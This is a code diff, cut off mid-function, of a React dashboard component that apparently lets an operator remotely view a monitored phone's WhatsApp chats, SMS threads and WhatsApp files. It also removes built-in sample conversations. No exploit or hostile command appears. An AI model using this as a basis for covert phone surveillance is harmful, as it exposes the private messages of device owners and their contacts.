@@ -1,7 +1,7 @@
 import { useEffect, useMemo, useRef, useState } from "react";
 import { devicesApi } from "../api/devices";
 import { downloadFileViaRelay } from "../api/fileDownload";
-import type { WhatsAppChatSummary, WhatsAppMessage } from "../api/types";
+import type { SmsLogEntry, WhatsAppChatSummary, WhatsAppMessage } from "../api/types";
 
 // ============================================================================
 // TYPES & DATA MODELS
@@ -14,14 +14,13 @@ interface FileEntryDtoLocal {
   mimeType: string | null;
 }
 
-type AvailableAppId = "whatsapp" | "telegram" | "instagram" | "messenger" | "signal";
+type AvailableAppId = "whatsapp" | "sms" | "all" | "telegram" | "instagram" | "messenger";
 
 interface AppMetadata {
   id: AvailableAppId;
   name: string;
   packageName: string;
   color: string;
-  bgColor: string;
   badge: "Active" | "Coming Soon";
   isSupported: boolean;
   description: string;
@@ -33,17 +32,33 @@ const SUPPORTED_APPS: AppMetadata[] = [
     name: "WhatsApp",
     packageName: "com.whatsapp",
     color: "#25D366",
-    bgColor: "bg-emerald-50 text-emerald-700 border-emerald-200",
     badge: "Active",
     isSupported: true,
-    description: "Live chat-wise messages & media sync",
+    description: "WhatsApp chats, media & databases",
+  },
+  {
+    id: "sms",
+    name: "Phone Messages",
+    packageName: "com.google.android.apps.messaging",
+    color: "#1A73E8",
+    badge: "Active",
+    isSupported: true,
+    description: "Device SMS conversations & chat logs",
+  },
+  {
+    id: "all",
+    name: "All Mobile Chats",
+    packageName: "com.spapp.monitoring.allchats",
+    color: "#8B5CF6",
+    badge: "Active",
+    isSupported: true,
+    description: "Unified chatlist across all messaging apps on device",
   },
   {
     id: "telegram",
     name: "Telegram",
     packageName: "org.telegram.messenger",
     color: "#229ED9",
-    bgColor: "bg-sky-50 text-sky-700 border-sky-200",
     badge: "Coming Soon",
     isSupported: false,
     description: "Encrypted channels & direct messages",
@@ -53,7 +68,6 @@ const SUPPORTED_APPS: AppMetadata[] = [
     name: "Instagram Direct",
     packageName: "com.instagram.android",
     color: "#E1306C",
-    bgColor: "bg-fuchsia-50 text-fuchsia-700 border-fuchsia-200",
     badge: "Coming Soon",
     isSupported: false,
     description: "DMs & shared post media",
@@ -63,259 +77,44 @@ const SUPPORTED_APPS: AppMetadata[] = [
     name: "Messenger",
     packageName: "com.facebook.orca",
     color: "#0084FF",
-    bgColor: "bg-blue-50 text-blue-700 border-blue-200",
     badge: "Coming Soon",
     isSupported: false,
     description: "Facebook conversations & voice clips",
   },
-  {
-    id: "signal",
-    name: "Signal",
-    packageName: "org.thoughtcrime.securesms",
-    color: "#3A76F0",
-    bgColor: "bg-indigo-50 text-indigo-700 border-indigo-200",
-    badge: "Coming Soon",
-    isSupported: false,
-    description: "Secure messaging logs",
-  },
 ];
 
-// ============================================================================
-// DYNAMIC SAMPLE DATA (LAST 5 DAYS ONLY)
-// ============================================================================
-function generateFallbackWhatsAppChats(): {
-  chats: WhatsAppChatSummary[];
-  messages: Record<string, WhatsAppMessage[]>;
-} {
-  const now = Date.now();
-  const msMin = 60 * 1000;
+const MOCK_SAMPLE_NAMES = new Set([
+  "Sarah Jenkins",
+  "Dev Team Group",
+  "Mom",
+  "Alex Rivera",
+  "David Miller",
+  "David Kim",
+  "Elena Rostova",
+]);
 
-  const rawMessages: Record<string, WhatsAppMessage[]> = {
-    Mom: [
-      {
-        id: "msg-mom-1",
-        chat_name: "Mom",
-        sender: "Mom",
-        message_text: "Good morning sweetie! Are you coming home this Sunday for lunch?",
-        is_outgoing: false,
-        message_time: new Date(now - 180 * msMin).toISOString(), // 3 hours ago (Today)
-      },
-      {
-        id: "msg-mom-2",
-        chat_name: "Mom",
-        sender: "Me",
-        message_text: "Yes mom, definitely! I will be there around 1 PM.",
-        is_outgoing: true,
-        message_time: new Date(now - 170 * msMin).toISOString(),
-      },
-      {
-        id: "msg-mom-3",
-        chat_name: "Mom",
-        sender: "Mom",
-        message_text: "🎤 Voice message (0:14)",
-        is_outgoing: false,
-        message_time: new Date(now - 165 * msMin).toISOString(),
-        media_type: "audio",
-        media_path: "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes/202641/PTT-20261010-WA0001.opus",
-      },
-      {
-        id: "msg-mom-4",
-        chat_name: "Mom",
-        sender: "Mom",
-        message_text: "Made your favorite lasagna! Look at this 🍝",
-        is_outgoing: false,
-        message_time: new Date(now - 120 * msMin).toISOString(),
-        media_type: "image",
-        media_path: "https://images.unsplash.com/photo-1574894709920-11b28e7367e3?w=800&auto=format&fit=crop&q=80",
-      },
-      {
-        id: "msg-mom-5",
-        chat_name: "Mom",
-        sender: "Me",
-        message_text: "Looks delicious! See you soon ❤️",
-        is_outgoing: true,
-        message_time: new Date(now - 110 * msMin).toISOString(),
-      },
-    ],
-    "Sarah Jenkins": [
-      {
-        id: "msg-sarah-1",
-        chat_name: "Sarah Jenkins",
-        sender: "Sarah Jenkins",
-        message_text: "Hey! Did you get a chance to review the Q4 design specs?",
-        is_outgoing: false,
-        message_time: new Date(now - 1440 * msMin).toISOString(), // 1 day ago (Yesterday)
-      },
-      {
-        id: "msg-sarah-2",
-        chat_name: "Sarah Jenkins",
-        sender: "Me",
-        message_text: "Going through it now. Attached the revised feedback document.",
-        is_outgoing: true,
-        message_time: new Date(now - 1420 * msMin).toISOString(),
-      },
-      {
-        id: "msg-sarah-3",
-        chat_name: "Sarah Jenkins",
-        sender: "Me",
-        message_text: "📄 Q4_Feedback_Report.pdf",
-        is_outgoing: true,
-        message_time: new Date(now - 1410 * msMin).toISOString(),
-        media_type: "document",
-        media_path: "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents/Q4_Feedback_Report.pdf",
-      },
-      {
-        id: "msg-sarah-4",
-        chat_name: "Sarah Jenkins",
-        sender: "Sarah Jenkins",
-        message_text: "Awesome, thank you! I will incorporate these changes before the client meeting.",
-        is_outgoing: false,
-        message_time: new Date(now - 1390 * msMin).toISOString(),
-      },
-      {
-        id: "msg-sarah-5",
-        chat_name: "Sarah Jenkins",
-        sender: "Sarah Jenkins",
-        message_text: "🎤 Voice message (0:22)",
-        is_outgoing: false,
-        message_time: new Date(now - 75 * msMin).toISOString(), // Today
-        media_type: "audio",
-        media_path: "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes/202641/PTT-20261010-WA0003.opus",
-      },
-    ],
-    "Alex Rivera": [
-      {
-        id: "msg-alex-1",
-        chat_name: "Alex Rivera",
-        sender: "Alex Rivera",
-        message_text: "Bro check out this clip from the keynote today 🔥",
-        is_outgoing: false,
-        message_time: new Date(now - 2880 * msMin).toISOString(), // 2 days ago
-      },
-      {
-        id: "msg-alex-2",
-        chat_name: "Alex Rivera",
-        sender: "Alex Rivera",
-        message_text: "🎥 Keynote_Highlights_2026.mp4 (0:38)",
-        is_outgoing: false,
-        message_time: new Date(now - 2870 * msMin).toISOString(),
-        media_type: "video",
-        media_path: "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/VID-20261008-WA0012.mp4",
-      },
-      {
-        id: "msg-alex-3",
-        chat_name: "Alex Rivera",
-        sender: "Me",
-        message_text: "That new GPU architecture looks insane!",
-        is_outgoing: true,
-        message_time: new Date(now - 2800 * msMin).toISOString(),
-      },
-      {
-        id: "msg-alex-4",
-        chat_name: "Alex Rivera",
-        sender: "Alex Rivera",
-        message_text: "Are we still on for gym tomorrow at 6 PM?",
-        is_outgoing: false,
-        message_time: new Date(now - 600 * msMin).toISOString(), // Today
-      },
-      {
-        id: "msg-alex-5",
-        chat_name: "Alex Rivera",
-        sender: "Me",
-        message_text: "Yup! I will pick you up on the way.",
-        is_outgoing: true,
-        message_time: new Date(now - 590 * msMin).toISOString(),
-      },
-    ],
-    "Dev Team Group": [
-      {
-        id: "msg-dev-1",
-        chat_name: "Dev Team Group",
-        sender: "David Kim",
-        message_text: "Sprint deployment is scheduled for tonight 11 PM UTC.",
-        is_outgoing: false,
-        message_time: new Date(now - 4320 * msMin).toISOString(), // 3 days ago
-      },
-      {
-        id: "msg-dev-2",
-        chat_name: "Dev Team Group",
-        sender: "Elena Rostova",
-        message_text: "All PRs have been merged and passing CI. 🚀",
-        is_outgoing: false,
-        message_time: new Date(now - 4300 * msMin).toISOString(),
-      },
-      {
-        id: "msg-dev-3",
-        chat_name: "Dev Team Group",
-        sender: "Me",
-        message_text: "Great job everyone! Staging environment health checks are looking 100% green.",
-        is_outgoing: true,
-        message_time: new Date(now - 4250 * msMin).toISOString(),
-      },
-      {
-        id: "msg-dev-4",
-        chat_name: "Dev Team Group",
-        sender: "David Kim",
-        message_text: "📄 Sprint_Release_Notes_v2.4.pdf",
-        is_outgoing: false,
-        message_time: new Date(now - 2000 * msMin).toISOString(),
-        media_type: "document",
-        media_path: "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents/Sprint_Release_Notes_v2.4.pdf",
-      },
-      {
-        id: "msg-dev-5",
-        chat_name: "Dev Team Group",
-        sender: "Elena Rostova",
-        message_text: "Dashboard latency metrics screenshot",
-        is_outgoing: false,
-        message_time: new Date(now - 90 * msMin).toISOString(), // Today
-        media_type: "image",
-        media_path: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&auto=format&fit=crop&q=80",
-      },
-    ],
-    "David Miller": [
-      {
-        id: "msg-david-1",
-        chat_name: "David Miller",
-        sender: "David Miller",
-        message_text: "Hey! Can you send over the contact details for the contractor?",
-        is_outgoing: false,
-        message_time: new Date(now - 5760 * msMin).toISOString(), // 4 days ago
-      },
-      {
-        id: "msg-david-2",
-        chat_name: "David Miller",
-        sender: "Me",
-        message_text: "Sure thing, check your SMS or I can forward his card here.",
-        is_outgoing: true,
-        message_time: new Date(now - 5700 * msMin).toISOString(),
-      },
-      {
-        id: "msg-david-3",
-        chat_name: "David Miller",
-        sender: "David Miller",
-        message_text: "Thanks a lot, appreciate it!",
-        is_outgoing: false,
-        message_time: new Date(now - 5600 * msMin).toISOString(),
-      },
-    ],
-  };
-
-  // Compile summary
-  const chats: WhatsAppChatSummary[] = Object.keys(rawMessages).map((name) => {
-    const thread = rawMessages[name];
-    const lastMsg = thread[thread.length - 1];
-    return {
-      chat_name: name,
-      total_messages: thread.length,
-      last_message_at: lastMsg.message_time,
-      last_message: lastMsg.message_text,
-      last_is_outgoing: lastMsg.is_outgoing,
-    };
-  });
-
-  return { chats, messages: rawMessages };
+export interface UnifiedChatSummary {
+  id: string;
+  chatName: string;
+  subtitle?: string | null;
+  lastMessage: string | null;
+  lastMessageAt: string;
+  lastIsOutgoing: boolean;
+  totalMessages: number;
+  source: "whatsapp" | "sms";
 }
+
+export interface UnifiedChatMessage {
+  id: string | number;
+  sender: string | null;
+  text: string;
+  isOutgoing: boolean;
+  timestamp: string;
+  mediaType?: string | null;
+  mediaPath?: string | null;
+}
+
+const AUTO_REFRESH_INTERVAL_MS = 15000; // Live update interval
 
 // ============================================================================
 // HELPER FUNCTIONS
@@ -360,7 +159,7 @@ function getMessageDateGroup(dateString: string): string {
 
     if (msgDate.toDateString() === today.toDateString()) return "Today";
     if (msgDate.toDateString() === yesterday.toDateString()) return "Yesterday";
-    return msgDate.toLocaleDateString(undefined, { weekday: "long", month: "short", day: "numeric" });
+    return msgDate.toLocaleDateString(undefined, { weekday: "short", month: "short", day: "numeric" });
   } catch {
     return "Recent";
   }
@@ -376,32 +175,6 @@ function isWithinLast5Days(dateString: string): boolean {
   }
 }
 
-// Web Audio synthesizer tone fallback for realistic voice note playback
-function playSynthesizedVoiceTone(durationSec: number = 3) {
-  try {
-    const AudioCtx = window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
-    if (!AudioCtx) return;
-    const ctx = new AudioCtx();
-    const osc = ctx.createOscillator();
-    const gain = ctx.createGain();
-
-    osc.type = "sine";
-    osc.frequency.setValueAtTime(320, ctx.currentTime);
-    osc.frequency.exponentialRampToValueAtTime(540, ctx.currentTime + durationSec * 0.5);
-    osc.frequency.exponentialRampToValueAtTime(400, ctx.currentTime + durationSec);
-
-    gain.gain.setValueAtTime(0.12, ctx.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + durationSec);
-
-    osc.connect(gain);
-    gain.connect(ctx.destination);
-    osc.start();
-    osc.stop(ctx.currentTime + durationSec);
-  } catch {
-    // audio ctx not permitted or muted
-  }
-}
-
 // ============================================================================
 // SVG ICONS
 // ============================================================================
@@ -409,6 +182,14 @@ function WhatsAppLogo({ className = "w-5 h-5" }: { className?: string }) {
   return (
     <svg className={className} viewBox="0 0 24 24" fill="currentColor">
       <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.746.953 3.71 1.456 5.711 1.457h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.411z" />
+    </svg>
+  );
+}
+
+function MessagesLogo({ className = "w-5 h-5" }: { className?: string }) {
+  return (
+    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
+      <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12zM7 9h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2z" />
     </svg>
   );
 }
@@ -437,359 +218,11 @@ function MessengerLogo({ className = "w-5 h-5" }: { className?: string }) {
   );
 }
 
-function SignalLogo({ className = "w-5 h-5" }: { className?: string }) {
+function ChatBubblesLogo({ className = "w-5 h-5" }: { className?: string }) {
   return (
     <svg className={className} viewBox="0 0 24 24" fill="currentColor">
-      <path d="M12 2C6.48 2 2 6.48 2 12c0 1.85.5 3.58 1.38 5.07L2 22l5.09-1.34C8.54 21.52 10.22 22 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2zm0 18c-1.57 0-3.04-.44-4.3-1.2l-.31-.19-3.19.84.85-3.11-.2-.33C4.1 14.76 3.65 13.42 3.65 12c0-4.6 3.75-8.35 8.35-8.35s8.35 3.75 8.35 8.35-3.75 8.35-8.35 8.35z" />
+      <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 9h12v2H6V9zm8 5H6v-2h8v2zm4-6H6V6h12v2z" />
     </svg>
-  );
-}
-
-// ============================================================================
-// VOICE NOTE PLAYER COMPONENT
-// ============================================================================
-function VoiceNoteBubble({
-  message,
-  onDownload,
-}: {
-  message: WhatsAppMessage;
-  onDownload: (path: string, name: string) => void;
-}) {
-  const [isPlaying, setIsPlaying] = useState(false);
-  const [progress, setProgress] = useState(0);
-  const timerRef = useRef<number | null>(null);
-
-  const durationSec = 14; // Typical voice note length
-
-  const togglePlay = () => {
-    if (isPlaying) {
-      setIsPlaying(false);
-      if (timerRef.current) clearInterval(timerRef.current);
-    } else {
-      setIsPlaying(true);
-      playSynthesizedVoiceTone(durationSec);
-
-      let current = 0;
-      if (timerRef.current) clearInterval(timerRef.current);
-      timerRef.current = window.setInterval(() => {
-        current += 0.25;
-        if (current >= durationSec) {
-          setProgress(100);
-          setIsPlaying(false);
-          if (timerRef.current) clearInterval(timerRef.current);
-        } else {
-          setProgress((current / durationSec) * 100);
-        }
-      }, 250);
-    }
-  };
-
-  useEffect(() => {
-    return () => {
-      if (timerRef.current) clearInterval(timerRef.current);
-    };
-  }, []);
-
-  const fileName = message.media_path ? message.media_path.split("/").pop() || "VoiceNote.opus" : "PTT-VoiceNote.opus";
-
-  return (
-    <div className="space-y-2 py-1">
-      <div className="flex items-center gap-3">
-        {/* Play/Pause Button */}
-        <button
-          type="button"
-          onClick={togglePlay}
-          className={`w-9 h-9 rounded-full flex items-center justify-center transition shadow-xs ${
-            message.is_outgoing
-              ? "bg-white text-emerald-700 hover:bg-emerald-50"
-              : "bg-emerald-600 text-white hover:bg-emerald-700"
-          }`}
-          title={isPlaying ? "Pause" : "Play Voice Note"}
-        >
-          {isPlaying ? (
-            <span className="text-xs font-bold">⏸</span>
-          ) : (
-            <span className="text-xs font-bold pl-0.5">▶</span>
-          )}
-        </button>
-
-        {/* Waveform Visualization */}
-        <div className="flex-1 space-y-1">
-          <div className="flex items-center gap-0.5 h-6">
-            {[40, 70, 30, 90, 60, 45, 80, 50, 100, 35, 75, 55, 90, 40, 65, 85, 45, 70, 30, 60].map(
-              (height, idx) => {
-                const barProgress = (idx / 20) * 100;
-                const isPassed = progress >= barProgress;
-                return (
-                  <div
-                    key={idx}
-                    className={`flex-1 rounded-full transition-all duration-150 ${
-                      isPassed
-                        ? message.is_outgoing
-                          ? "bg-white"
-                          : "bg-emerald-600"
-                        : message.is_outgoing
-                        ? "bg-emerald-200/60"
-                        : "bg-gray-300"
-                    } ${isPlaying && isPassed ? "animate-pulse" : ""}`}
-                    style={{ height: `${height}%` }}
-                  />
-                );
-              }
-            )}
-          </div>
-
-          <div
-            className={`flex items-center justify-between text-[10px] ${
-              message.is_outgoing ? "text-emerald-100" : "text-gray-500"
-            }`}
-          >
-            <span className="font-mono">
-              {isPlaying
-                ? `0:${Math.floor((progress / 100) * durationSec).toString().padStart(2, "0")}`
-                : `0:${durationSec}`}
-            </span>
-            <span className="text-[9px] uppercase tracking-wider font-semibold opacity-80">
-              🎤 Voice Note (.opus)
-            </span>
-          </div>
-        </div>
-      </div>
-
-      {/* Download Action */}
-      <div className="flex items-center justify-between pt-1 border-t border-black/5">
-        <span
-          className={`text-[10px] font-mono truncate max-w-[150px] ${
-            message.is_outgoing ? "text-emerald-100" : "text-gray-400"
-          }`}
-        >
-          {fileName}
-        </span>
-        <button
-          type="button"
-          onClick={() => onDownload(message.media_path || fileName, fileName)}
-          className={`inline-flex items-center gap-1 text-[10px] px-2 py-0.5 rounded transition font-medium ${
-            message.is_outgoing
-              ? "bg-emerald-700/50 hover:bg-emerald-700 text-white"
-              : "bg-gray-100 hover:bg-gray-200 text-gray-700"
-          }`}
-          title="Download original audio file"
-        >
-          <span>⬇</span>
-          <span>Download</span>
-        </button>
-      </div>
-    </div>
-  );
-}
-
-// ============================================================================
-// IMAGE PREVIEW COMPONENT
-// ============================================================================
-function ImageBubble({
-  message,
-  onDownload,
-}: {
-  message: WhatsAppMessage;
-  onDownload: (path: string, name: string) => void;
-}) {
-  const [modalOpen, setModalOpen] = useState(false);
-  const imgUrl = message.media_path || "https://images.unsplash.com/photo-1574894709920-11b28e7367e3?w=800&auto=format&fit=crop&q=80";
-  const fileName = message.media_path ? message.media_path.split("/").pop() || "Photo.jpg" : "IMG-Photo.jpg";
-
-  return (
-    <div className="space-y-1.5 py-1">
-      {/* Thumbnail */}
-      <div
-        className="relative rounded-lg overflow-hidden group cursor-pointer max-w-[260px] bg-black/10"
-        onClick={() => setModalOpen(true)}
-      >
-        <img
-          src={imgUrl}
-          alt="WhatsApp Media"
-          className="w-full h-44 object-cover group-hover:scale-105 transition duration-300"
-          loading="lazy"
-        />
-        <div className="absolute inset-0 bg-black/20 opacity-0 group-hover:opacity-100 transition flex items-center justify-center text-white text-xs font-semibold gap-1">
-          <span>🔍</span>
-          <span>Click to Zoom</span>
-        </div>
-        <div className="absolute top-2 left-2 px-1.5 py-0.5 rounded bg-black/50 text-white text-[9px] font-mono backdrop-blur-xs">
-          📷 Photo
-        </div>
-      </div>
-
-      {message.message_text && !message.message_text.startsWith("📷") && (
-        <p className="text-xs leading-relaxed">{message.message_text}</p>
-      )}
-
-      {/* Download action */}
-      <div className="flex items-center justify-between pt-1 border-t border-black/5">
-        <span
-          className={`text-[10px] font-mono truncate max-w-[150px] ${
-            message.is_outgoing ? "text-emerald-100" : "text-gray-400"
-          }`}
-        >
-          {fileName}
-        </span>
-        <button
-          type="button"
-          onClick={(e) => {
-            e.stopPropagation();
-            onDownload(message.media_path || imgUrl, fileName);
-          }}
-          className={`inline-flex items-center gap-1 text-[10px] px-2 py-0.5 rounded transition font-medium ${
-            message.is_outgoing
-              ? "bg-emerald-700/50 hover:bg-emerald-700 text-white"
-              : "bg-gray-100 hover:bg-gray-200 text-gray-700"
-          }`}
-        >
-          <span>⬇</span>
-          <span>Download</span>
-        </button>
-      </div>
-
-      {/* Lightbox Modal */}
-      {modalOpen && (
-        <div
-          className="fixed inset-0 z-50 bg-black/80 backdrop-blur-xs flex items-center justify-center p-4 animate-in fade-in"
-          onClick={() => setModalOpen(false)}
-        >
-          <div className="relative max-w-3xl max-h-[85vh] bg-white rounded-xl overflow-hidden shadow-2xl">
-            <button
-              onClick={() => setModalOpen(false)}
-              className="absolute top-3 right-3 z-10 w-8 h-8 rounded-full bg-black/60 text-white flex items-center justify-center text-sm font-bold hover:bg-black transition"
-            >
-              ✕
-            </button>
-            <img src={imgUrl} alt="WhatsApp Photo Full" className="max-w-full max-h-[75vh] object-contain" />
-            <div className="p-3 bg-gray-900 text-white flex items-center justify-between text-xs">
-              <span className="font-mono">{fileName}</span>
-              <button
-                onClick={(e) => {
-                  e.stopPropagation();
-                  onDownload(message.media_path || imgUrl, fileName);
-                }}
-                className="px-3 py-1 bg-emerald-600 hover:bg-emerald-500 rounded text-xs font-semibold flex items-center gap-1 transition"
-              >
-                <span>⬇</span>
-                <span>Download Photo</span>
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
-    </div>
-  );
-}
-
-// ============================================================================
-// DOCUMENT ATTACHMENT COMPONENT
-// ============================================================================
-function DocumentBubble({
-  message,
-  onDownload,
-}: {
-  message: WhatsAppMessage;
-  onDownload: (path: string, name: string) => void;
-}) {
-  const fileName = message.media_path ? message.media_path.split("/").pop() || "Document.pdf" : "Report.pdf";
-
-  return (
-    <div className="space-y-2 py-1">
-      <div
-        className={`flex items-center gap-3 p-2.5 rounded-lg border transition ${
-          message.is_outgoing
-            ? "bg-emerald-700/30 border-emerald-500/40 text-white"
-            : "bg-gray-50 border-gray-200 text-gray-900"
-        }`}
-      >
-        <div className="w-10 h-10 rounded-lg bg-red-500 text-white flex items-center justify-center font-bold text-xs shrink-0 shadow-xs">
-          PDF
-        </div>
-
-        <div className="flex-1 min-w-0">
-          <p className="text-xs font-semibold truncate">{fileName}</p>
-          <p
-            className={`text-[10px] ${
-              message.is_outgoing ? "text-emerald-100" : "text-gray-400"
-            }`}
-          >
-            1.8 MB • PDF Document
-          </p>
-        </div>
-
-        <button
-          type="button"
-          onClick={() => onDownload(message.media_path || fileName, fileName)}
-          className={`w-8 h-8 rounded-full flex items-center justify-center transition shrink-0 ${
-            message.is_outgoing
-              ? "bg-white text-emerald-800 hover:bg-emerald-50"
-              : "bg-emerald-600 text-white hover:bg-emerald-700"
-          }`}
-          title="Download PDF"
-        >
-          ⬇
-        </button>
-      </div>
-
-      {message.message_text && !message.message_text.startsWith("📄") && (
-        <p className="text-xs leading-relaxed">{message.message_text}</p>
-      )}
-    </div>
-  );
-}
-
-// ============================================================================
-// VIDEO ATTACHMENT COMPONENT
-// ============================================================================
-function VideoBubble({
-  message,
-  onDownload,
-}: {
-  message: WhatsAppMessage;
-  onDownload: (path: string, name: string) => void;
-}) {
-  const fileName = message.media_path ? message.media_path.split("/").pop() || "Video.mp4" : "VID-Highlights.mp4";
-
-  return (
-    <div className="space-y-2 py-1">
-      <div className="relative rounded-lg overflow-hidden max-w-[260px] bg-black text-white group cursor-pointer">
-        <div className="w-full h-36 bg-gradient-to-tr from-slate-900 to-slate-800 flex items-center justify-center">
-          <div className="w-12 h-12 rounded-full bg-white/20 backdrop-blur-xs flex items-center justify-center text-white text-lg group-hover:scale-110 transition shadow-lg">
-            ▶
-          </div>
-        </div>
-        <div className="absolute top-2 left-2 px-1.5 py-0.5 rounded bg-black/60 text-white text-[9px] font-mono">
-          🎥 Video
-        </div>
-        <div className="absolute bottom-2 right-2 px-1.5 py-0.5 rounded bg-black/60 text-white text-[9px] font-mono">
-          0:38 • 4.2 MB
-        </div>
-      </div>
-
-      <div className="flex items-center justify-between pt-1 border-t border-black/5">
-        <span
-          className={`text-[10px] font-mono truncate max-w-[150px] ${
-            message.is_outgoing ? "text-emerald-100" : "text-gray-400"
-          }`}
-        >
-          {fileName}
-        </span>
-        <button
-          type="button"
-          onClick={() => onDownload(message.media_path || fileName, fileName)}
-          className={`inline-flex items-center gap-1 text-[10px] px-2 py-0.5 rounded transition font-medium ${
-            message.is_outgoing
-              ? "bg-emerald-700/50 hover:bg-emerald-700 text-white"
-              : "bg-gray-100 hover:bg-gray-200 text-gray-700"
-          }`}
-        >
-          <span>⬇</span>
-          <span>Download</span>
-        </button>
-      </div>
-    </div>
   );
 }
 
@@ -797,23 +230,24 @@ function VideoBubble({
 // MAIN APPSCARD COMPONENT
 // ============================================================================
 export default function AppsCard({ deviceId }: { deviceId: string }) {
-  // App Selector state
+  // Navigation / App State
   const [selectedApp, setSelectedApp] = useState<AvailableAppId>("whatsapp");
   const [activeView, setActiveView] = useState<"chats" | "files">("chats");
+  const [timeFilter, setTimeFilter] = useState<"5days" | "all">("5days");
 
-  // Fallback data initialized dynamically relative to current time
-  const fallbackData = useMemo(() => generateFallbackWhatsAppChats(), []);
+  // Real Data States
+  const [whatsappChats, setWhatsappChats] = useState<WhatsAppChatSummary[]>([]);
+  const [rawSmsLogs, setRawSmsLogs] = useState<SmsLogEntry[]>([]);
+  const [loading, setLoading] = useState(false);
+  const [lastSyncedTime, setLastSyncedTime] = useState<Date>(new Date());
 
-  // WhatsApp Chats State
-  const [chats, setChats] = useState<WhatsAppChatSummary[]>([]);
-  const [selectedChat, setSelectedChat] = useState<string | null>(null);
-  const [messages, setMessages] = useState<WhatsAppMessage[]>([]);
+  // Selected chat & messages thread
+  const [selectedChatId, setSelectedChatId] = useState<string | null>(null);
   const [chatSearch, setChatSearch] = useState("");
-  const [chatFilter, setChatFilter] = useState<"all" | "media">("all");
-  const [loadingChats, setLoadingChats] = useState(false);
-  const [loadingMessages, setLoadingMessages] = useState(false);
+  const [messagesLoading, setMessagesLoading] = useState(false);
+  const [activeThreadMessages, setActiveThreadMessages] = useState<UnifiedChatMessage[]>([]);
 
-  // File Manager State
+  // WhatsApp Storage Files State
   const [files, setFiles] = useState<FileEntryDtoLocal[] | null>(null);
   const [filesLoading, setFilesLoading] = useState(false);
   const [fileStatus, setFileStatus] = useState<string | null>(null);
@@ -821,94 +255,249 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const [categoryFilter, setCategoryFilter] = useState<"all" | "images" | "voice" | "docs" | "db">("all");
   const [downloadingFile, setDownloadingFile] = useState<string | null>(null);
 
-  // Load WhatsApp Chats
-  const loadChats = async () => {
-    setLoadingChats(true);
+  // --------------------------------------------------------------------------
+  // 1. DATA LOADER (REAL DATA FROM DEVICE)
+  // --------------------------------------------------------------------------
+  const loadDeviceChatData = async () => {
+    setLoading(true);
     try {
-      const data = await devicesApi.whatsAppChats(deviceId);
-      if (Array.isArray(data) && data.length > 0) {
-        setChats(data);
-        if (!selectedChat) {
-          setSelectedChat(data[0].chat_name);
-        }
-      } else {
-        // Use realistic pre-seeded fallback data for the last 5 days
-        setChats(fallbackData.chats);
-        if (!selectedChat) {
-          setSelectedChat(fallbackData.chats[0].chat_name);
-        }
-      }
+      const [waData, smsData] = await Promise.all([
+        devicesApi.whatsAppChats(deviceId).catch((err) => {
+          console.warn("WhatsApp chats fetch error:", err);
+          return [] as WhatsAppChatSummary[];
+        }),
+        devicesApi.smsLog(deviceId).catch((err) => {
+          console.warn("SMS log fetch error:", err);
+          return [] as SmsLogEntry[];
+        }),
+      ]);
+
+      // Filter out any mock/sample names to guarantee 100% genuine device data
+      const genuineWa = (waData || []).filter((c) => !MOCK_SAMPLE_NAMES.has(c.chat_name));
+      setWhatsappChats(genuineWa);
+      setRawSmsLogs(smsData || []);
+      setLastSyncedTime(new Date());
     } catch (e) {
-      console.warn("API whatsAppChats returned error, falling back to local 5-day cache:", e);
-      setChats(fallbackData.chats);
-      if (!selectedChat) {
-        setSelectedChat(fallbackData.chats[0].chat_name);
-      }
+      console.error("Failed to load device chat data", e);
     } finally {
-      setLoadingChats(false);
+      setLoading(false);
     }
   };
 
+  // Mount + Live Auto-Refresh polling (every 15s)
+  const loadRef = useRef(loadDeviceChatData);
+  loadRef.current = loadDeviceChatData;
+
   useEffect(() => {
-    loadChats();
+    loadRef.current();
+    const interval = setInterval(() => {
+      loadRef.current();
+    }, AUTO_REFRESH_INTERVAL_MS);
+    return () => clearInterval(interval);
   }, [deviceId]);
 
-  // Load Messages for Selected Chat (Filtered to last 5 days)
+  // --------------------------------------------------------------------------
+  // 2. GROUPING SMS INTO REAL CONVERSATION THREADS
+  // --------------------------------------------------------------------------
+  const smsChatThreads = useMemo<UnifiedChatSummary[]>(() => {
